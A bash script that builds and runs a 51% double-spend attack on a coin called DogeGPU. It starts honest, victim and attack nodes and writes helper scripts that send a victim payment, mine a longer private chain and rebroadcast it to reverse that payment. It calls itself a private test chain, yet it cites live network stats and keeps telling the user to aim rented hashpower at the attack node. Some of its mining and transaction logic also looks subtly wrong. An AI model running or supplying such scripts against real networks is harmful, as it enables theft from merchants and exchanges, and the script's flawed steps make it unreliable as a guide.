#!/bin/bash

# 51% Double Spend Attack Execution Script
# For your private DogeGPU test blockchain

echo "🎯 EXECUTING 51% ATTACK ON DOGEGPU BLOCKCHAIN"
echo "================================================"
echo "📊 Network Stats: Block 1,861,257 | 970 MH/s hashrate"
echo "⚡ Your hashpower: >485 MH/s (51%+ attack capability)"
echo ""

# Kill any existing processes
echo "🧹 Cleaning up existing processes..."
pkill -f dogpud 2>/dev/null
sleep 3

# Start nodes in background
echo "🚀 Starting attack infrastructure..."

echo "1️⃣ Starting Honest Node (main network simulation)..."
./dogpud -datadir=honest_node -daemon &
sleep 5

echo "2️⃣ Starting Victim Node (double-spend target)..."  
./dogpud -datadir=victim_node -daemon &
sleep 5

echo "3️⃣ Starting Attack Node (your private chain)..."
./dogpud -datadir=attack_node -daemon &
sleep 5

# Wait for nodes to start
echo "⏳ Waiting for nodes to initialize..."
sleep 10

echo "✅ All nodes started!"
echo ""
echo "📋 Node Status Check:"

# Check if nodes are running
if pgrep -f "dogpud.*honest_node" > /dev/null; then
    echo "✅ Honest Node: Running (RPC: 8332, P2P: 8333)"
else
    echo "❌ Honest Node: Failed to start"
fi

if pgrep -f "dogpud.*victim_node" > /dev/null; then
    echo "✅ Victim Node: Running (RPC: 8336, P2P: 8337)"
else
    echo "❌ Victim Node: Failed to start"
fi

if pgrep -f "dogpud.*attack_node" > /dev/null; then
    echo "✅ Attack Node: Running (RPC: 8334, P2P: 8335)"
else
    echo "❌ Attack Node: Failed to start"
fi

echo ""
echo "🎯 READY FOR 51% ATTACK!"
echo ""
echo "📝 Next Steps:"
echo "1. Check sync status: ./check_nodes.sh"
echo "2. Create victim transaction: ./create_victim_tx.sh"
echo "3. Execute double-spend: ./double_spend.sh"
echo ""
echo "💡 Your rented hashpower should be pointed to Attack Node (port 8335)"
echo "🔥 Once you have >51% hashpower, you can reorganize the blockchain!"

# Create helper scripts
cat > check_nodes.sh << 'EOF'
#!/bin/bash
echo "📊 Node Status Check:"
echo "===================="

echo "Honest Node Block Count:"
./dogpu-cli -datadir=honest_node getblockcount 2>/dev/null || echo "❌ Not responding"

echo "Victim Node Block Count:"  
./dogpu-cli -datadir=victim_node getblockcount 2>/dev/null || echo "❌ Not responding"

echo "Attack Node Block Count:"
./dogpu-cli -datadir=attack_node getblockcount 2>/dev/null || echo "❌ Not responding"

echo ""
echo "Network Info:"
./dogpu-cli -datadir=honest_node getnetworkinfo 2>/dev/null | grep -E "(connections|version)" || echo "❌ Network info unavailable"
EOF

cat > create_victim_tx.sh << 'EOF'
#!/bin/bash
echo "💰 Creating Victim Transaction for Double-Spend Attack"
echo "====================================================="

# Generate addresses
echo "🔑 Generating addresses..."
VICTIM_ADDR=$(./dogpu-cli -datadir=victim_node getnewaddress)
ATTACKER_ADDR=$(./dogpu-cli -datadir=attack_node getnewaddress)

echo "Victim Address: $VICTIM_ADDR"
echo "Attacker Address: $ATTACKER_ADDR"

# Check balances
echo ""
echo "💰 Checking balances..."
HONEST_BALANCE=$(./dogpu-cli -datadir=honest_node getbalance)
echo "Honest Node Balance: $HONEST_BALANCE DOGPU"

if (( $(echo "$HONEST_BALANCE > 1000" | bc -l) )); then
    echo "✅ Sufficient balance for attack"
    
    echo ""
    echo "🎯 Creating victim transaction (1000 DOGPU)..."
    TXID=$(./dogpu-cli -datadir=honest_node sendtoaddress $VICTIM_ADDR 1000)
    echo "Transaction ID: $TXID"
    
    echo "⏳ Waiting for confirmation..."
    sleep 30
    
    echo "📊 Transaction status:"
    ./dogpu-cli -datadir=honest_node gettransaction $TXID
    
    echo ""
    echo "🎯 VICTIM TRANSACTION CREATED!"
    echo "💡 Now run: ./double_spend.sh to execute the attack"
    
else
    echo "❌ Insufficient balance. Need to mine some blocks first."
    echo "💡 Run: ./dogpu-cli -datadir=honest_node generate 101"
fi
EOF

cat > double_spend.sh << 'EOF'
#!/bin/bash
echo "💥 EXECUTING DOUBLE-SPEND ATTACK!"
echo "================================="

# Get current block height
HONEST_HEIGHT=$(./dogpu-cli -datadir=honest_node getblockcount)
echo "📊 Current honest chain height: $HONEST_HEIGHT"

# Disconnect attack node from network
echo "🔌 Isolating attack node from network..."
./dogpu-cli -datadir=attack_node disconnectnode "127.0.0.1:8333"

# Generate attacker address
ATTACKER_ADDR=$(./dogpu-cli -datadir=attack_node getnewaddress)
echo "🎯 Attacker address: $ATTACKER_ADDR"

# Create conflicting transaction on private chain
echo "💰 Creating conflicting transaction on private chain..."
ATTACK_TXID=$(./dogpu-cli -datadir=attack_node sendtoaddress $ATTACKER_ADDR 1000)
echo "Attack transaction ID: $ATTACK_TXID"

# Mine private chain faster than honest chain
echo "⛏️  Mining private chain with your >51% hashpower..."
echo "💡 Point your rented hashpower to attack node (port 8335) NOW!"
echo ""
echo "🔥 Mining blocks to overtake honest chain..."

# Mine enough blocks to overtake honest chain
BLOCKS_TO_MINE=$((HONEST_HEIGHT + 10))
echo "📊 Mining $BLOCKS_TO_MINE blocks on private chain..."

./dogpu-cli -datadir=attack_node generate $BLOCKS_TO_MINE

# Check private chain height
ATTACK_HEIGHT=$(./dogpu-cli -datadir=attack_node getblockcount)
echo "📊 Private chain height: $ATTACK_HEIGHT"

if [ $ATTACK_HEIGHT -gt $HONEST_HEIGHT ]; then
    echo "✅ Private chain is longer! Ready to reorganize network."
    
    # Reconnect to network to broadcast longer chain
    echo "🌐 Reconnecting to network to broadcast longer chain..."
    ./dogpu-cli -datadir=attack_node addnode "127.0.0.1:8333" "add"
    
    sleep 10
    
    # Check if reorganization happened
    NEW_HONEST_HEIGHT=$(./dogpu-cli -datadir=honest_node getblockcount)
    echo "📊 Honest node height after reorg: $NEW_HONEST_HEIGHT"
    
    if [ $NEW_HONEST_HEIGHT -eq $ATTACK_HEIGHT ]; then
        echo "🎉 SUCCESS! 51% ATTACK COMPLETED!"
        echo "✅ Blockchain reorganized to attacker's chain"
        echo "💰 Double-spend successful - original transaction reversed"
        echo "🔥 You now control the blockchain with >51% hashpower"
    else
        echo "⚠️  Reorganization may still be in progress..."
        echo "💡 Check node status in a few minutes"
    fi
else
    echo "❌ Private chain not long enough. Need more hashpower!"
    echo "💡 Ensure your rented hashpower is pointed to port 8335"
fi
EOF

chmod +x check_nodes.sh create_victim_tx.sh double_spend.sh

echo ""
echo "🎯 ATTACK SCRIPTS CREATED!"
echo "========================="
echo "✅ check_nodes.sh - Check node synchronization"
echo "✅ create_victim_tx.sh - Create transaction to double-spend"  
echo "✅ double_spend.sh - Execute the 51% attack"
echo ""
echo "🚀 Your 51% attack environment is ready!"
echo "💡 Point your rented hashpower to Attack Node (port 8335) when ready"